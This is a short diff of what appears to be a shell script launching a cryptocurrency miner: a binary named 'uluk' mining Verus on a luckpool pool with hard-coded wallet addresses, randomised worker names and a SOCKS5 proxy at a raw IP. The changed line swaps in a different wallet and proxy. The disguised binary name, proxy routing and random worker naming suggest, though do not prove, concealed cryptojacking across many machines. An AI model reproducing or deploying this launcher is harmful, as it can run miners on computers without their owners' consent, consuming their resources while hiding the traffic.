@@ -7,4 +7,4 @@ POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
 WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
 PROXY=socks5://192.210.231.73:40130
-./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./uluk -a verus -o $POOL -u RTEmjgEnFktDbtCLTqxof98bYN7v9syLAM.iyazz1 -t 2 -x 51.222.13.193
